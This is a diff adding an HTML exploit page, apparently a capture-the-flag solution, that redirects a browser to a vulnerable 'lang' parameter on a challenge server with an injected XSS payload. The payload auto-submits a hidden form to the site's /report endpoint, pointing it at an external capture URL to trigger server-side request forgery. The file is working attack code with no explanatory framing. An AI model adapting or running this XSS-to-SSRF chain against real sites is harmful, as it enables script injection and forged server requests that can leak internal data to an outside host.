@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Safe SSRF Exploit</title>
+    <script>
+        // Inject XSS payload into the vulnerable endpoint
+        const xssPayload = `
+            alert("[Debug] XSS executed!");
+            console.log("[Debug] Injecting SSRF payload...");
+
+            // Create a form to submit the SSRF payload to /report
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = '/report';
+
+            // Add the URL input targeting your capture endpoint
+            const urlInput = document.createElement('input');
+            urlInput.type = 'hidden';
+            urlInput.name = 'url';
+            urlInput.value = 'https://ssrf-eta.vercel.app/api/capture'; // External URL for testing
+            form.appendChild(urlInput);
+
+            // Automatically submit the form
+            document.body.appendChild(form);
+            form.submit();
+        `;
+
+        // Vulnerable endpoint with the XSS injection
+        const targetUrl = 'http://chal1.lagncra.sh:8426/?lang=' + encodeURIComponent(xssPayload);
+
+        // Redirect to the vulnerable endpoint
+        window.location.href = targetUrl;
+    </script>
+</head>
+<body>
+    <p>Redirecting to exploit SSRF...</p>
+</body>
+</html>
